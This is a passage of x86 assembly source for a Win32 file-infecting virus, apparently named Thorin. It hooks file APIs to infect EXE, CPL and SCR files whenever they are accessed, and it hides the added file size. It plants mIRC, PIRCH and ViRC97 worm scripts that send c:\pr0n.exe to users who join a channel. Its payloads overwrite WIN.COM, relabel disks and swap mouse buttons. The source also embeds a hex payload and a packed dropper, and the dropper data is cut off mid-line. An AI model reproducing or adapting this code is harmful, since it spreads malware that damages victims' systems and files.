	cmp     dword ptr [edx+00h],00h
	jz      nopes
	cmp     byte ptr  [edx+03h],80h
	jz      reloop
	
	mov     edi,dword ptr [ebp+TempGA_IT1]
	mov     ecx,dword ptr [ebp+TempGA_IT2]
	mov     esi,[edx]
	add     esi,dword ptr [ebp+imagebase]
	add     esi,2
	push    ecx
	rep     cmpsb
	pop     ecx
	jz      wegotit
reloop:
	inc     ebx
	add     edx,4
	loop    loopy
wegotit:
	shl     ebx,2
	add     ebx,eax
	mov     eax,[ebx]
	db      0B1h
nopes:
	stc
	ret
GetAPI_IT       endp

; ===========================================================================
; Payloads
; ===========================================================================
; White trash get down on your knees... and you'll get cake and sodomy!

payload         proc
        apicall _GetTickCount                   ; Get a random payload
	and     eax,payload_number
	lea     esi,[ebp+payload_table+eax*4]
	lodsd
	add     eax,ebp
	call    eax                             ; Call to it
	ret
payload         endp

payload1        proc
	push    00000000h                       ; Mmm, a new win.com :)
	push    00000080h
	push    00000002h
	push    00000000h
	push    00000001h
	push    40000000h
	call    ___
	db      "C:\WIN.COM",0
___:    apicall _CreateFileA
	push    eax
	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    p_size
	lea     ebx,[ebp+payl0ad]
	push    ebx
	push    eax
	apicall _WriteFile
	apicall _CloseHandle
	ret
payload1        endp

payload2        proc
	call    __
	db      "THORIN",0                      ; HD Name is... THORIN :)
__:     push    00000000h
	apicall _SetVolumeLabelA
	ret
payload2        endp

payload3        proc
	push    00000001h
	apicall _SwapMouseButton                ; Left is right, right is left
	ret
payload3        endp

payload4        proc
	push    00001010h                       ; Display message
	lea     eax,[ebp+vname]
	push    eax
	call    _2

; Stupid message to annoy user... panic ain't good, but... what is good? ;)

	db      "Thorin... Thorin... Thorin... Thorin... Thorin...",13,13
	db      "I am Thorin, son of Thrain, son of Thror",13
	db      "and your computer is mine... mwahahahahaha!",13
	db      "I will give you... the death you deserve!",13,13
	db      "...Thorin ...Thorin ...Thorin ...Thorin ...Thorin",0

_2:     push    00000000h
	apicall _MessageBoxA
payload4        endp

payload5        proc
	lea     ebx,[ebp+szSHELL32]
	push    ebx
	apicall _LoadLibraryA                   ; Get SHELL32 base address
	lea     ecx,[ebp+@ShellExecuteA]        
	push    ecx
	push    eax
	apicall _GetProcAddress                 ; Get ShellExecuteA address
	xor     ebx,ebx
	push    ebx
	push    ebx
	push    ebx
	lea     ecx,[ebp+szMicro$oft]
	push    ecx
	lea     ecx,[ebp+szOPEN]
	push    ecx
	push    ebx
	call    eax                             ; Open Micro$oft web
	ret
payload5        endp

; ===========================================================================
; Some miscellaneous functions
; ===========================================================================
; ALIGN
;
; input:
;       EAX = Number to align
;       ECX = Alignment factor
; output:
;       EAX = Aligned number
;

Align           proc
	push    edx
	xor     edx,edx
	push    eax
	div     ecx
	pop     eax
	sub     ecx,edx
	add     eax,ecx
	pop     edx
	ret
Align           endp

; TRUNCFILE
;
; input:
;       ECX = Where trunc file
; output:
;       Nothing.
;

TruncFile       proc
	xor     eax,eax
	push    eax
	push    eax
	push    ecx
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer
	push    dword ptr [ebp+FileHandle]
	apicall _SetEndOfFile
	ret
TruncFile       endp

; OPENFILE
;
; input:
;       ESI = Pointer to file
; output:
;       EAX = Handle (if succesful) / -1 (if failed)
;

OpenFile        proc
	xor     eax,eax
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h or 80000000h
	push    esi
	apicall _CreateFileA
	ret
OpenFile        endp

; CREATEMAP
;
; input:
;       ECX = Size to map
; output:
;       EAX = Handle (if succesful) / 0 (if failed)
;

CreateMap       proc
	xor     eax,eax
	push    eax
	push    ecx
	push    eax
	push    00000004h
	push    eax
	push    dword ptr [ebp+FileHandle]
	apicall _CreateFileMappingA
	ret
CreateMap       endp

; MAPFILE
;
; input:
;       ECX = Size to map
; output:
;       EAX = Handle (if succesful) / 0 (if failed)

MapFile         proc
	xor     eax,eax
	push    ecx
	push    eax
	push    eax
	push    000F001Fh
	push    dword ptr [ebp+MapHandle]
	apicall _MapViewOfFile
	ret
MapFile         endp

; REGEXIST
;
; input:
;       ESI = Pointer to key name
; output:
;       CF  = Set to 1 if it exist, to 0 if it doesn't
;

RegExist        proc
	lea     eax,[ebp+RegHandle]
	push    eax
	push    000F003Fh
	push    00000000h
	push    esi
	push    80000001h
	apicall _RegOpenKeyExA
	cmp     eax,2
	jz      RegExistExitCF0
	push    dword ptr [ebp+RegHandle]
	apicall _CloseHandle
	stc
	ret
RegExistExitCF0:
	clc
	ret
RegExist        endp

; PUTREG
;
; input:
;       ESI = Pointer to key name
; output:
;       Nothing.
;

PutReg          proc
	lea     eax,[ebp+Disposition]
	push    eax
	lea     eax,[ebp+RegHandle]
	push    eax
	xor     eax,eax
	push    eax
	push    000F003Fh
	push    eax
	push    eax
	push    eax
	push    esi
	push    80000001h
	apicall _RegCreateKeyExA
	push    dword ptr [ebp+RegHandle]
	apicall _CloseHandle
	ret
PutReg          endp

; DELREG
;
; input:
;       ESI = Pointer to key name
; output:
;       Nothing.
;

DelReg          proc
	push    esi
	push    80000001h
	apicall _RegDeleteKeyA
	ret
DelReg          endp

; TERMINATEPROC
;
; input:
;       EDI = Pointer to the name of the window of the process we wanna kill
; output:
;       CF  = Set to 1 if it wasn't found or killed, to 0 if it was killed
;

TerminateProc   proc
	xor     ebx,ebx                                 ; Thnx 2 Bennyg0d :)
	push    edi
	push    ebx
	apicall _FindWindowA
	xchg    eax,ecx
	jecxz   TP_ErrorExit
	push    ebx
	push    ebx
	push    00000012h
	push    ecx
	apicall _PostMessageA
	mov     cl,00h
	org     $-1
TP_ErrorExit:
	stc
	ret
TerminateProc   endp

; GETLASTSECTION
;
; input:
;       ESI = Pointer to PE header
; output:
;       ESI = Pointer to last section
;       EDI = Pointer to PE header
;

GetLastSection  proc
	mov     edi,esi
	movzx   eax,word ptr [edi+06h]          ; Get ptr to last section
	dec     eax
	imul    eax,eax,28h                     ; C'mon, feel the noise...
	add     esi,eax
	add     esi,78h
	mov     edx,[edi+74h]
	shl     edx,03h
	add     esi,edx
	ret
GetLastSection  endp

; ===========================================================================
; Get Delta Offset
; ===========================================================================
;
; input:
;       Nothing.
; output:
;       ECX = Delta Offset
;

GetDeltaOffset  proc
	call    getitright                      ; Oh! What is this? Incredible!
getitright:
	pop     ebp
	sub     ebp,offset getitright
	ret
GetDeltaOffset   endp

; ===========================================================================
; Dropper unpacker (25 bytes) <<->> [LSCE] - Little Shitty Compression Engine
; ===========================================================================
;
; ???     ??????? ??????? ??????? 
; ? ?     ? ????? ? ????? ? ????? The Little and Shitty Compression Engine
; ? ????? ????? ? ? ????? ? ????? Poorly coded and written by...
; ??????? ??????? ??????? ??????? Who cares? :) Well... by me. Any problem?
;
; This is a very simple packing engine, based in the repetition of zeros that
; the PE  files have, thus it is  able to compress a PE file... Hehehe, i can
; put a dropper without caring about  its space! That was  the only reason of
; make this little shit. Maybe one day i will make a 'real' compression engi-
; ne, but today i'm too busy :)
;
; input:
;        EDI = Offset where unpack
;        ESI = Data to unpack
;        ECX = Size of packed data
; output:
;        Nothing.
;

LSCE_UnPack     proc
	xor     eax,eax                         ; 2 bytes       Hehehe, i
process_byte:                                   ;               think i'm
	lodsb                                   ; 1 byte        turning a
	or      al,al                           ; 2 bytes       little bit
	jnz     store_byte                      ; 2 bytes       paranoid...
	dec     ecx                             ; 1 byte
	dec     ecx                             ; 1 byte
	lodsw                                   ; 2 bytes
	push    ecx                             ; 1 byte
	xor     ecx,ecx                         ; 2 bytes
	xchg    eax,ecx                         ; 1 byte
	rep     stosb                           ; 2 bytes
	pop     ecx                             ; 1 byte
	loop    process_byte                    ; 2 bytes
	jecxz   all_unpacked                    ; 2 bytes
store_byte:
	stosb                                   ; 1 byte
	loop    process_byte                    ; 2 bytes
all_unpacked:
	ret                                     ; 2 bytes
LSCE_UnPack      endp

; ===========================================================================
; Hook all the possible APIs, of host IT
; ===========================================================================

HookAllAPIs:
	mov     eax,dword ptr [ebp+ModBase]     ; file modbase=file imagebase
	mov     dword ptr [ebp+imagebase],eax

	lea     edi,[ebp+@@Hookz]               ; Ptr to the first API
nxtapi: push    edi
	call    GetAPI_IT                       ; Get it from Import Table
	pop     edi
	jc      Next_IT_Struc_                  ; Fail? Damn...

	xor     al,al                           ; Reach the end of API string
	scasb
	jnz     $-1

	mov     eax,[edi]                       ; All must be in its place :)
	add     eax,ebp
	mov     [ebx],eax
Next_IT_Struc:
	add     edi,4
	cmp     byte ptr [edi],""              ; Reach the last api? Grrr...
	jz      AllHooked
	jmp     nxtapi
AllHooked:
	ret

Next_IT_Struc_:
	xor     al,al
	scasb
	jnz     $-1
	jmp     Next_IT_Struc

; A bard was our savior!

	db      0,"[Glory to the Bards!]",0

; ===========================================================================
; Hooks' code
; ===========================================================================

HookMoveFileA:
	call    DoHookStuff
	jmp     [eax+_MoveFileA]

HookCopyFileA:
	call    DoHookStuff
	jmp     [eax+_CopyFileA]

HookGetFullPathNameA:
	call    DoHookStuff
	jmp     [eax+_GetFullPathNameA]

HookDeleteFileA:
	call    DoHookStuff
	jmp     [eax+_DeleteFileA]

HookWinExec:
	call    DoHookStuff
	jmp     [eax+_WinExec]

HookCreateFileA:
	call    DoHookStuff
	jmp     [eax+_CreateFileA]

HookCreateProcessA:
	call    DoHookStuff
	jmp     [eax+_CreateProcessA]       

HookGetFileAttributesA:
	call    DoHookStuff
	jmp     [eax+_GetFileAttributesA]

HookFindFirstFileA:
	pushad                                  ; Save all reggies
	call    GetDeltaOffset                  ; EBP = Delta Offset
	mov     eax,[esp+20h]                   ; EAX = Return Address
	mov     dword ptr [ebp+FFRetAddress],eax
	mov     eax,[esp+28h]                   ; EAX = Ptr to WFD
	mov     dword ptr [ebp+FF_WFD],eax

        mov     [esp.PUSHAD_EAX],ebp
	popad
        add     esp,4                           ; Remove this ret address from
						; stack

	call    [eax+_FindFirstFileA]           ; Call original API

	test    eax,eax                         ; Fail? Shit...
	jz      FF_GoAway

	pushad                                  ; Save reggies and flaggies
	pushfd

	call    GetDeltaOffset                  ; Delta again

	movzx   ebx,byte ptr [ebp+WFD_Handles_Count] ; Number of active hndlers
	mov     edx,[ebp+WFD_HndInMem]          ; Our Handle table in mem

	mov     esi,12345678h                   ; Ptr to filename
FF_WFD  equ     $-4
	add     esi,(offset WFD_szFileName-offset WIN32_FIND_DATA)

	cmp     ebx,n_Handles                   ; Over max hnd storing?
	jae     AvoidStoring                    ; Shit...

; WFD_Handles structure
; ?????????????????????
;       +00h    WFD Handle
;       +04h    Address of its WIN32_FIND_DATA

	mov     dword ptr [edx+ebx*8],eax       ; Store Handle
	mov     dword ptr [edx+ebx*8+4],esi     ; Store WFD offset

	inc     byte ptr [ebp+WFD_Handles_Count]
      
AvoidStoring:
	push    esi
	call    Check4ValidFile                 ; Is a reliable file 4 inf?
	pop     edi 
	jc      FF_AvoidInfekt                  ; Duh!

	push    edi
	call    _Infection                      ; Infect it
	pop     esi

	call    Info4Stealth                    ; Get, if available, old file's
						; size
	jc      FF_AvoidInfekt

	mov     ecx,dword ptr [ebp+FF_WFD]
	add     ecx,(offset WFD_nFileSizeLow-offset WIN32_FIND_DATA)
	mov     [ecx],eax                       ; Size stealth!

FF_AvoidInfekt:
	popfd
	popad

FF_GoAway:                                      ; Return to caller
	push    12345678h
FFRetAddress equ $-4
	ret

HookFindNextFileA:
	pushad                                  ; Save all reggies
	call    GetDeltaOffset                  ; Get delta offset
	mov     eax,[esp+20h]                   ; EAX = Return address
	mov     dword ptr [ebp+FNRetAddress],eax
	mov     eax,[esp+24h]                   ; EAX = Search Handle
	mov     dword ptr [ebp+FN_Hnd],eax
        mov     [esp.PUSHAD_EAX],ebp
	popad

        add     esp,4

	call    [eax+_FindNextFileA]            ; Call original API
	or      eax,eax                         ; Fail? Damn.
	jz      FN_GoAway

	pushad                                  ; Save regs and flags
	pushfd

	call    GetDeltaOffset                  ; Get delta again

	mov     eax,12345678h                   ; EAX = Search Handle
FN_Hnd  equ     $-4

	call    Check4ValidHandle               ; Is in our table? If yes,
	jc      FN_AvoidInfekt                  ; infect.

	xchg    esi,eax                         ; ESI = Pointer to WFD

	mov     dword ptr [ebp+FN_FS],esi       ; Save if for later
	add     esi,(offset WFD_szFileName-offset WIN32_FIND_DATA)
	push    esi                             ; ESI = Ptr to filename
	call    Check4ValidFile                 ; Is reliable its inf.?
	pop     edi     
	jc      FN_AvoidInfekt                  ; Duh...
	push    edi
	call    _Infection                      ; Infect it !
	pop     esi
	call    Info4Stealth                    ; Retrieve info for possible
						; stealth...
	jc      FN_AvoidInfekt

	mov     ecx,12345678h
FN_FS   equ     $-4
	add     ecx,(offset WFD_nFileSizeLow-offset WIN32_FIND_DATA)
	mov     [ecx],eax                       ; Size Stealth, dude!

FN_AvoidInfekt:
	popfd                                   ; Restore flags & regs
	popad

FN_GoAway:                                      ; Return to caller
	push    12345678h
FNRetAddress equ $-4
	ret

HookGetProcAddress:
	pushad                                  ; Save all the registers
	call    GetDeltaOffset                  ; EBP = Delta Offset
	mov     eax,[esp+24h]                   ; EAX = Base address of module
	cmp     eax,dword ptr [ebp+kernel]      ; Is EAX=K32?
	jnz     OriginalGPA                     ; If not, it's not our problem
        mov     [esp.PUSHAD_EAX],ebp
	popad
	pop     dword ptr [eax+HGPA_RetAddress] ; Put ret address in a safe place

	call    [eax+_GetProcAddress]           ; Call original API
	or      eax,eax                         ; Fail? Duh!
	jz      HGPA_SeeYa

	pushad
	xchg    eax,ebx                         ; EBX = Address of function

	call    GetDeltaOffset                  ; EBP = Delta offset

	mov     ecx,n_HookedAPIs                ; ECX = Number of hooked apis
	lea     esi,[ebp+@@HookedOffsetz]       ; ESI = Ptr to array of API
						; addresses
	xor     edx,edx                         ; EDX = Counter (set to 0)
HGPA_IsHookableAPI?:
	lodsd                                   ; EAX = API from array
	cmp     ebx,eax                         ; Is equal to requested address?
	jz      HGPA_IndeedItIs                 ; If yes, it's interesting 4 us
	inc     edx                             ; Increase counter
	loop    HGPA_IsHookableAPI?             ; Search loop
	jmp     OriginalGPAx

HGPA_IndeedItIs:
	lea     edi,[ebp+@@Hookz]               ; EDI = Ptr to hooked API strings
	xor     ebx,ebx                         ; EBX = New counter
HGPA_AndWhatAPI?:
	cmp     edx,ebx                         ; We want EBX = EDX
	jz      HGPA_ThisAPI
	xor     al,al                           ; Travel trough the Hooks
	scasb                                   ; structure
	jnz     $-1
	add     edi,4
	inc     ebx
	jmp     HGPA_AndWhatAPI?
HGPA_ThisAPI:
	xor     al,al                           ; EDI = Points to requested
	scasb                                   ; api string
	jnz     $-1
	mov     eax,[edi]                       ; Get its offset
	add     eax,ebp                         ; Adjust it to delta
        mov     [esp.PUSHAD_EAX],eax
	popad

HGPA_SeeYa:
	push    12345678h
HGPA_RetAddress equ $-4
	ret

OriginalGPAx:
        mov     [esp.PUSHAD_EAX],ebp
        popad
	push    dword ptr [eax+HGPA_RetAddress]
	jmp     [eax+_GetProcAddress]

OriginalGPA:
        mov     [esp.PUSHAD_EAX],ebp
        popad
	jmp     [eax+_GetProcAddress]

; ===========================================================================
; Hooked "standard" APIs handler
; ===========================================================================

DoHookStuff:
	pushad
	pushfd
	call    GetDeltaOffset
	mov     edx,[esp+2Ch]                   ; Get filename to infect
	mov     esi,edx
	call    Check4ValidFile
	jc      ErrorDoHookStuff
InfectWithHookStuff:
	xchg    edi,edx
	call    _Infection
ErrorDoHookStuff:
	popfd                                   ; Preserve all as if nothing
	popad                                   ; happened :)
	push    ebp
	call    GetDeltaOffset                  ; Get delta offset 
	xchg    eax,ebp
	pop     ebp
	ret

; ===========================================================================
; Retrieve information for size-stealth
; ===========================================================================
;
; input:
;       ESI = Pointer to file name
; output:
;       EAX = Old Size (Stored at PE Header+44h)
;       CF  = Set to 1 if error (file not infected, I/O, etc)
;

Info4Stealth:
	and     byte ptr [ebp+CoolFlag],00h     ; Flag to 0

	call    OpenFile                        ; Open File
	cmp_    eax,I4S_Error

	mov     dword ptr [ebp+FileHandle],eax  ; Store its handler

	push    00000000h                       ; Get file's size
	push    eax
	apicall _GetFileSize
	xchg    eax,ecx

	push    ecx                             ; Create its mapping
	call    CreateMap
	pop     ecx

	cmpz_   eax,I4S_Error_CloseFileHnd

	mov     dword ptr [ebp+MapHandle],eax   ; Save handler
	
	call    MapFile                         ; Create a mapping view
	cmpz_   eax,I4S_Error_CloseMapHnd

	mov     dword ptr [ebp+MapAddress],eax  ; Store mapping address

	mov     esi,[eax+3Ch]
	add     esi,eax
	cmp     dword ptr [esi],"EP"            ; Is it PE?
	jnz     I4S_Error_UnMapHnd

	push    dword ptr [esi+orig_size]       ; Get original's file size
	pop     dword ptr [ebp+OldSize]         ; And put it in a temp place

	inc     byte ptr [ebp+CoolFlag]         ; Set flag to 1

I4S_Error_UnMapHnd:
	push    dword ptr [ebp+MapAddress]      ; Close map view of file
	apicall _UnmapViewOfFile

I4S_Error_CloseMapHnd:
	push    dword ptr [ebp+MapHandle]       ; Close map handle
	apicall _CloseHandle

I4S_Error_CloseFileHnd:
	push    dword ptr [ebp+FileHandle]      ; Close file handle
	apicall _CloseHandle

	cmp     byte ptr [ebp+CoolFlag],00h     ; Were we able to open? If yes,
	jz      I4S_Error                       ; leave stack clear...

I4S_Successful:
	mov     eax,12345678h
OldSize equ     $-4
	mov     cl,00h
	org     $-1
I4S_Error:
	stc
	ret

; ===========================================================================
; Check if file infection is reliable 
; ===========================================================================
;
; input:
;       ESI = Pointer to file name
; output:
;       CF  = Set to 1 if it's reliable, to 0 if it isn't
;

Check4ValidFile:
	lodsb
	or      al,al                           ; Find NULL? Shit...
	jz      C4VF_Error
	cmp     al,"."                          ; Dot found? Interesting...
	jnz     Check4ValidFile
	dec     esi
	lodsd                                   ; Put extension in EAX
	or      eax,20202020h                   ; Make string locase
	not     eax
	cmp     eax,not "exe."                  ; Is it an EXE? Infect!!!
	jz      C4VF_Successful
	cmp     eax,not "lpc."                  ; Is it a CPL? Infect!!!
	jz      C4VF_Successful
	cmp     eax,not "rcs."                  ; Is is a SCR? Infect!!!
	jnz     C4VF_Error
C4VF_Successful:
	mov     cl,00h
	org     $-1
C4VF_Error:
	stc
	ret

; ===========================================================================
; Check if handle was stored previously
; ===========================================================================
;
; input:
;       EAX = Handle
; output:
;       EAX = WFD Offset of given handle
;       EDX = Places what it occupies in WFD_Handles structure
;       CF  = Set to 1 if it's found, to 0 if it wasn't
;

Check4ValidHandle:
	xor     edx,edx
	mov     edi,[ebp+WFD_HndInMem]
C4VH_l00p:
	cmp     edx,n_Handles                   ; Over limits? Shit...
	jae     C4VH_Error

	cmp     eax,[edx*8+edi]                 ; EAX = a handler stored in
	jz      C4VH_Successful                 ; table

	inc     edx                             ; Increase counter
	jmp     C4VH_l00p
C4VH_Successful:
	mov     eax,[edx*8+edi+4]               ; EAX = WFD Offset

	mov     cl,00h
	org     $-1
C4VH_Error:
	stc
	ret

; ===========================================================================
; mIRC worm
; ===========================================================================

mIRCWorm        db      "[script]",10
		db      "n0=ON 1:JOIN:#: {/if ($nick==$me) { halt }",10
		db      "n1=/dcc send $nick c:\pr0n.exe",10
		db      "n2=}",10
		db      "n3=ON 1:TEXT:*pr0n*:#:/quit Win32.mIRC32.Thorin 1.00",10
		db      "n4=ON 1:TEXT:*virus*:#:/ignore -u666 $nick",10
		db      "n5=ON 1:CONNECT: {",10
		db      "n6=/msg Billy_Bel You are the g0d of fuck!",10
		db      "n7=}",10
mIRCWormSize    equ     ($-offset mIRCWorm)

; ===========================================================================
; PIRCH worm
; ===========================================================================

PirchWorm       db      "[Levels]",10
		db      "Enabled=1",10
		db      "Count=1",10
		db      "Level1=ThorinWorm",10,10
		db      "[ThorinWorm]",10
		db      "User1=*!*@*",10
		db      "UserCount=1",10
		db      "Event1=;Thorin is here",10
		db      "Event2=ON JOIN:#:/dcc send $nick c:\pr0n.exe",10
		db      "Event3=;Win32.PIRCH32.Thorin 1.00",10
		db      "EventCount=3",10
PirchWormSize   equ     ($-offset PirchWorm)

; ===========================================================================
; ViRC97 worm
; ===========================================================================

ViRC97Worm      db      "Name Win32.ViRC97.Thorin 1.00",10
		db      "// Events",10,10
		db      'Event JOIN "* JOIN"',10
		db      "  DCC Send $nick c:\pr0n.exe",10
		db      "EndEvent",10
ViRC97WormSize  equ     ($-offset ViRC97Worm)

; ===========================================================================
; Payload code
; ===========================================================================

payl0ad label   byte
	db      0B8h, 003h, 000h, 0CDh, 010h, 0BEh, 051h, 002h
	db      0E8h, 0F7h, 000h, 033h, 0C0h, 0CDh, 016h, 03Ch
	db      063h, 074h, 003h, 0E9h, 0C7h, 000h, 0BEh, 0BCh
	db      003h, 0E8h, 0E6h, 000h, 033h, 0C0h, 0CDh, 016h
	db      03Ch, 061h, 074h, 003h, 0E9h, 0B6h, 000h, 0BEh
	db      005h, 004h, 0E8h, 0D5h, 000h, 033h, 0C0h, 0CDh
	db      016h, 03Ch, 062h, 074h, 003h, 0E9h, 0A5h, 000h
	db      0E8h, 09Bh, 000h, 059h, 06Fh, 075h, 020h, 064h
	db      065h, 06Dh, 06Fh, 06Eh, 073h, 074h, 072h, 061h
	db      074h, 065h, 064h, 02Ch, 020h, 061h, 074h, 020h
	db      06Ch, 065h, 061h, 073h, 074h, 02Ch, 020h, 074h
	db      068h, 061h, 074h, 020h, 079h, 06Fh, 075h, 020h
	db      068h, 061h, 076h, 065h, 020h, 072h, 065h, 061h
	db      064h, 020h, 027h, 054h, 068h, 065h, 020h, 048h
	db      06Fh, 062h, 062h, 069h, 074h, 027h, 02Eh, 02Eh
	db      02Eh, 00Ah, 00Dh, 041h, 06Eh, 064h, 020h, 074h
	db      068h, 069h, 073h, 020h, 06Dh, 061h, 064h, 065h
	db      073h, 020h, 079h, 06Fh, 075h, 020h, 06Fh, 06Eh
	db      065h, 020h, 06Fh, 066h, 020h, 074h, 068h, 065h
	db      020h, 063h, 068h, 06Fh, 073h, 065h, 06Eh, 02Eh
	db      020h, 04Eh, 06Fh, 077h, 020h, 073h, 069h, 06Dh
	db      070h, 06Ch, 079h, 020h, 065h, 06Eh, 074h, 065h
	db      072h, 020h, 077h, 069h, 06Eh, 064h, 06Fh, 077h
	db      073h, 00Ah, 00Dh, 064h, 069h, 072h, 065h, 063h
	db      074h, 06Fh, 072h, 079h, 020h, 061h, 06Eh, 064h
	db      020h, 074h, 079h, 070h, 065h, 020h, 027h, 077h
	db      069h, 06Eh, 027h, 00Ah, 00Dh, 024h, 05Ah, 0B4h
	db      009h, 0CDh, 021h, 0CDh, 020h, 0E4h, 021h, 00Ch
	db      002h, 0E6h, 021h, 0E8h, 015h, 000h, 00Ah, 00Dh
	db      059h, 06Fh, 075h, 020h, 061h, 072h, 065h, 020h
	db      061h, 020h, 06Ch, 06Fh, 073h, 065h, 072h, 02Eh
	db      02Eh, 02Eh, 024h, 05Ah, 0B4h, 009h, 0CDh, 021h
	db      0EBh, 0DBh, 0B4h, 00Eh, 0ACh, 00Ah, 0C0h, 074h
	db      007h, 0CDh, 010h, 0E8h, 003h, 000h, 0EBh, 0F4h
	db      0C3h, 050h, 053h, 051h, 052h, 0BAh, 040h, 001h
	db      0BBh, 000h, 002h, 0E4h, 061h, 024h, 0FCh, 034h
	db      002h, 0E6h, 061h, 081h, 0C2h, 048h, 092h, 0B1h
	db      003h, 0D3h, 0CAh, 08Bh, 0CAh, 081h, 0E1h, 0FFh
	db      001h, 083h, 0C9h, 00Ah, 0E2h, 0FEh, 04Bh, 075h
	db      0E6h, 024h, 0FCh, 0E6h, 061h, 0BBh, 001h, 000h
	db      032h, 0E4h, 0CDh, 01Ah, 003h, 0DAh, 0CDh, 01Ah
	db      03Bh, 0D3h, 075h, 0FAh, 05Ah, 059h, 05Bh, 058h
	db      0C3h, 048h, 069h, 021h, 020h, 049h, 027h, 06Dh
	db      020h, 054h, 068h, 06Fh, 072h, 069h, 06Eh, 02Ch
	db      020h, 073h, 06Fh, 06Eh, 020h, 06Fh, 066h, 020h
	db      054h, 068h, 072h, 061h, 069h, 06Eh, 02Ch, 020h
	db      073h, 06Fh, 06Eh, 020h, 06Fh, 066h, 020h, 054h
	db      068h, 072h, 06Fh, 072h, 02Eh, 02Eh, 02Eh, 00Ah
	db      00Dh, 049h, 020h, 06Fh, 077h, 06Eh, 020h, 079h
	db      06Fh, 075h, 072h, 020h, 063h, 06Fh, 06Dh, 070h
	db      075h, 074h, 065h, 072h, 020h, 073h, 069h, 06Eh
	db      063h, 065h, 020h, 073h, 06Fh, 06Dh, 065h, 020h
	db      074h, 069h, 06Dh, 065h, 020h, 061h, 067h, 06Fh
	db      02Ch, 020h, 062h, 075h, 074h, 020h, 069h, 027h
	db      076h, 065h, 020h, 062h, 065h, 065h, 06Eh, 00Ah
	db      00Dh, 069h, 06Eh, 020h, 073h, 069h, 06Ch, 065h
	db      06Eh, 063h, 065h, 020h, 073h, 069h, 06Eh, 063h
	db      065h, 020h, 06Eh, 06Fh, 077h, 02Eh, 02Eh, 02Eh
	db      020h, 049h, 020h, 068h, 061h, 076h, 065h, 06Eh
	db      027h, 074h, 020h, 06Eh, 06Fh, 074h, 068h, 069h
	db      06Eh, 067h, 020h, 061h, 067h, 061h, 069h, 06Eh
	db      069h, 073h, 074h, 020h, 070h, 065h, 06Fh, 070h
	db      06Ch, 065h, 020h, 069h, 06Eh, 00Ah, 00Dh, 067h
	db      065h, 06Eh, 065h, 072h, 061h, 06Ch, 02Ch, 020h
	db      062h, 075h, 074h, 020h, 069h, 020h, 068h, 061h
	db      074h, 065h, 020h, 074h, 068h, 065h, 020h, 069h
	db      06Eh, 063h, 075h, 06Ch, 074h, 020h, 070h, 065h
	db      06Fh, 070h, 06Ch, 065h, 02Eh, 020h, 050h, 06Ch
	db      065h, 061h, 073h, 065h, 020h, 061h, 06Eh, 073h
	db      077h, 065h, 072h, 020h, 06Dh, 065h, 020h, 063h
	db      06Fh, 072h, 072h, 065h, 063h, 074h, 06Ch, 079h
	db      00Ah, 00Dh, 00Ah, 00Dh, 031h, 02Eh, 020h, 049h
	db      06Eh, 020h, 077h, 068h, 061h, 074h, 020h, 062h
	db      06Fh, 06Fh, 06Bh, 020h, 069h, 020h, 061h, 070h
	db      070h, 065h, 061h, 072h, 020h, 061h, 073h, 020h
	db      06Fh, 06Eh, 065h, 020h, 06Fh, 066h, 020h, 074h
	db      068h, 065h, 020h, 06Dh, 061h, 069h, 06Eh, 020h
	db      063h, 068h, 061h, 072h, 061h, 063h, 074h, 065h
	db      072h, 073h, 03Fh, 00Ah, 00Dh, 020h, 05Bh, 061h
	db      05Dh, 020h, 054h, 068h, 065h, 020h, 04Ch, 06Fh
	db      072h, 064h, 020h, 04Fh, 066h, 020h, 054h, 068h
	db      065h, 020h, 052h, 069h, 06Eh, 067h, 073h, 00Ah
	db      00Dh, 020h, 05Bh, 062h, 05Dh, 020h, 054h, 068h
	db      065h, 020h, 053h, 069h, 06Ch, 06Dh, 061h, 072h
	db      069h, 06Ch, 06Ch, 069h, 06Fh, 06Eh, 00Ah, 00Dh
	db      020h, 05Bh, 063h, 05Dh, 020h, 054h, 068h, 065h
	db      020h, 048h, 06Fh, 062h, 062h, 069h, 074h, 00Ah
	db      00Dh, 00Ah, 00Dh, 000h, 032h, 02Eh, 020h, 057h
	db      068h, 061h, 074h, 020h, 061h, 06Dh, 020h, 069h
	db      020h, 069h, 06Eh, 020h, 074h, 068h, 061h, 074h
	db      020h, 062h, 06Fh, 06Fh, 06Bh, 03Fh, 00Ah, 00Dh
	db      020h, 05Bh, 061h, 05Dh, 020h, 041h, 020h, 064h
	db      077h, 061h, 072h, 066h, 00Ah, 00Dh, 020h, 05Bh
	db      062h, 05Dh, 020h, 041h, 06Eh, 020h, 065h, 06Ch
	db      066h, 00Ah, 00Dh, 020h, 05Bh, 063h, 05Dh, 020h
	db      041h, 020h, 068h, 06Fh, 062h, 062h, 069h, 074h
	db      00Ah, 00Dh, 00Ah, 00Dh, 000h, 033h, 02Eh, 020h
	db      057h, 068h, 061h, 074h, 020h, 069h, 073h, 020h
	db      074h, 068h, 065h, 020h, 06Eh, 061h, 06Dh, 065h
	db      020h, 06Fh, 066h, 020h, 074h, 068h, 065h, 020h
	db      064h, 072h, 061h, 067h, 06Fh, 06Eh, 03Fh, 00Ah
	db      00Dh, 020h, 05Bh, 061h, 05Dh, 020h, 053h, 063h
	db      068h, 072h, 094h, 065h, 064h, 065h, 072h, 00Ah
	db      00Dh, 020h, 05Bh, 062h, 05Dh, 020h, 053h, 06Dh
	db      061h, 075h, 067h, 00Ah, 00Dh, 020h, 05Bh, 063h
	db      05Dh, 020h, 053h, 074h, 061h, 06Ch, 069h, 06Eh
	db      00Ah, 00Dh, 00Ah, 00Dh, 000h
p_size  equ     ($-offset payl0ad)

; ===========================================================================
; Dropper code (packed)
; ===========================================================================

dropper label   byte
	db      04Dh, 05Ah, 0F8h, 000h, 001h, 000h, 016h, 000h
	db      003h, 000h, 004h, 000h, 003h, 000h, 0FFh, 0FFh
	db      0F0h, 0FFh, 000h, 001h, 000h, 001h, 000h, 003h
	db      000h, 001h, 0F0h, 0FFh, 040h, 000h, 024h, 000h
	db      001h, 000h, 002h, 000h, 0E9h, 000h, 002h, 000h
	db      0E8h, 041h, 000h, 001h, 000h, 046h, 075h, 063h
	db      06Bh, 020h, 079h, 06Fh, 075h, 020h, 061h, 073h
	db      073h, 068h, 06Fh, 06Ch, 065h, 021h, 020h, 054h
	db      068h, 069h, 073h, 020h, 072h, 065h, 071h, 075h
	db      069h, 072h, 065h, 073h, 020h, 061h, 020h, 057h
	db      069h, 06Eh, 033h, 032h, 020h, 065h, 06Eh, 076h
